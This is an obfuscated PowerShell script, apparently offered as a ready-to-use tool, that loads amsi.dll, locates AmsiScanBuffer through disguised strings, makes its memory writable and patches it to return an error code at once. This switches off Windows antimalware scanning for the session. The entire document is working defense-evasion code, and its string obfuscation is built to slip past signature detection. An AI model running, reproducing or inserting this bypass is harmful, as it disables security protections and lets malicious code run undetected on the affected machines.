$kzcIlH3uldJxj3QxSiv = @"
using System;
using System.Runtime.InteropServices;
public class kzcIlH3uldJxj3QxSiv {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr AuE, string zv_G);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr b9ta5YGyE2vwrkgR, UIntPtr KxI1osyPuEEr, uint Yiz, out uint nNouB3F9eDjFNj);
}
"@

Add-Type $kzcIlH3uldJxj3QxSiv

$naDCB8iG = [kzcIlH3uldJxj3QxSiv]::LoadLibrary("$(('àmsì.d'+'ll').NORmALizE([CHar]([bYTE]0x46)+[CHaR]([Byte]0x6f)+[ChAr](114)+[ChAr]([bYte]0x6d)+[cHAR]([BytE]0x44)) -replace [chAr](7+85)+[chaR]([bYte]0x70)+[chaR](123*9/9)+[chaR]([BytE]0x4d)+[cHAR]([byte]0x6e)+[Char]([ByTe]0x7d))")
$TBvXS = [kzcIlH3uldJxj3QxSiv]::GetProcAddress($naDCB8iG, "$(('Ã'+'m'+'s'+'î'+'S'+'c'+'â'+'n'+'B'+'ú'+'f'+'f'+'è'+'r').NORmALiZE([Char]([BYTE]0x46)+[cHar]([BytE]0x6f)+[CHaR](114*17/17)+[cHAR](107+2)+[CHAr]([BYTe]0x44)) -replace [CHaR](92*39/39)+[ChaR]([byTE]0x70)+[cHAR]([bYtE]0x7b)+[cHAr](77+4-4)+[chAr]([ByTe]0x6e)+[chaR]([bYte]0x7d))")
$p = 0
[kzcIlH3uldJxj3QxSiv]::VirtualProtect($TBvXS, [uint32]5, 0x40, [ref]$p)
$eT3T_MZrTzK5xr = "0xB8"
$EuwHrA0YgL6 = "0x57"
$CHfTzaPgmYcKRM89F2 = "0x00"
$YPeuZZhzX6CE = "0x07"
$iIG0d = "0x80"
$vowqs_DJ3nXqRc = "0xC3"
$kAy = [Byte[]] ($eT3T_MZrTzK5xr,$EuwHrA0YgL6,$CHfTzaPgmYcKRM89F2,$YPeuZZhzX6CE,+$iIG0d,+$vowqs_DJ3nXqRc)
[System.Runtime.InteropServices.Marshal]::Copy($kAy, 0, $TBvXS, 6)